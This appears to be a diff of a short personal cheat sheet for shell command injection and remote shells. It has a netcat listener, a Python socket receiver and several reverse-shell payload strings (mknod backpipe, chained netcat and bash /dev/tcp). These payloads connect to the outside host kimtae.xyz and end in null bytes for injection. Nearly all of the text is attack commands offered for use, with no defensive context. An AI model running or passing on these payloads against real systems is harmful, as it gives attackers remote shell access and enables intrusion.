@@ -1,10 +1,12 @@
 
+__shell command injection__
 nc -l 12345 <&1 | ./exe > &0
-
-
 cmd 1>&2
 cmd 2>&1
+__
 
+
+__receive thread__
 def receiver() :
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ss.bind( ( '10.211.55.19' , 9998) )
@@ -14,7 +16,12 @@ def receiver() :
         print conn.recv(1024)
         conn.close()
 #threading.Thread(target=receiver).start()
+__
 
 
+__remote shell__
 nc -lvvp 9090 wait
-cmd = "mknod backpipe p; nc 10.211.55.19 9090 0<backpipe | /bin/bash 1>backpipe\x00"
+cmd = "mknod backpipe p; nc kimtae.xyz 8888 0<backpipe | /bin/bash 1>backpipe\x00"
+cmd = 'nc kimtae.xyz 8888 | /bin/sh | nc kimtae.xyz 8889\x00'
+cmd = "bash -c 'bash>&/dev/tcp/kimtae.xyz/8888 0>&1'\x00"
+__
